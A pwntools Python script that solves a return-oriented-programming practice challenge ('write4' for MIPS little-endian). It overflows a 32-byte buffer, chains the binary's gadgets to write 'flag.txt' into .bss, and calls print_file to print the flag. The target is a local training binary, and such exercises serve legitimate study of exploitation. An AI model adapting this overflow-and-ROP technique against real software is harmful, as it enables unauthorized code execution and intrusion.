from pwn import *

elf = ELF("write4_mipsel")

context.binary = elf
context.terminal = ['konsole', '-e']
context.log_level = logging.INFO

gdbscript = '''
set follow-fork-mode parent
break *pwnme+0x134
continue
'''

def connection():
    if args.GDB:
        c = gdb.debug([elf.path], gdbscript=gdbscript)
    else:
        c = process([elf.path])
    return c

BUFFER_SIZE = 32
READ_SIZE = 512

PATH = b'flag.txt'
MEMORY = elf.bss(0x800)

GADGET1 = elf.symbols.usefulGadgets
GADGET2 = elf.symbols.usefulGadgets + 0x18

def main():
    rop = ROP(elf)
    rop.raw(rop.generatePadding(0, BUFFER_SIZE + context.bytes))
    # write file name to memory (in 2 halves)
    rop.raw([GADGET1, [0, PATH[:context.bytes], MEMORY]])
    rop.raw([GADGET1, [0, PATH[context.bytes:], MEMORY + context.bytes]])
    # call target function with file name as arg
    rop.raw([GADGET2, 0, elf.symbols.print_file, MEMORY])
    payload = rop.chain()
    assert len(payload) <= READ_SIZE

    c = connection()
    c.sendafter(b'> ', payload)
    print(c.recvregex(rb'ROPE{.*}', capture=True).group().strip().decode())

if __name__ == '__main__':
    main()
